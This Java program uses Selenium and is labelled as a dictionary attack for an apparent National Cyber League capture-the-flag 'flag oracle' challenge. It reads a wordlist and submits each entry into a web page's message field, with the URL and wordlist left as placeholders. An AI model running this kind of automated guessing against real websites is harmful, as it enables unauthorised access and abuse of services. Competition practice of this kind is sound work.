import java.io.BufferedReader;
import java.io.FileReader;

import org.openqa.selenium.By;
import org.openqa.selenium.Keys;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.chrome.ChromeDriver;
import org.openqa.selenium.interactions.Actions;
/*
*				FLAG ORACLE
*				NCL - WEBSITE DICTIONARY ATTACK
*
*
*/

public class FlagOracle {

	public static void main(String[] args)throws Exception{

		BufferedReader br = new BufferedReader(new FileReader("ENTER THE FILE FOR WITH THE WORDLIST"));  
		WebDriver driver = new ChromeDriver();
		Actions act = new Actions(driver);



		driver.get("ENTER URL");   //ENTER THE URL 

		driver.findElement(By.id("name-input")).sendKeys("");  //ENTER HTML ID TAG
		Thread.sleep(2000);
		act.sendKeys(Keys.ENTER).build().perform();
		Thread.sleep(2000);

		String line = br.readLine(); 
		while (line != null)  
		{  
			System.out.println(line);
			driver.findElement(By.id("message-input")).sendKeys(line);				//LOOP THROUGH FILE
			act.sendKeys(Keys.ENTER).build().perform();
			line = br.readLine();  
		} 
		br.close();
		System.out.println("IF YOU CAN READ THIS ITS ALREADY TO LATE!");

	}
}

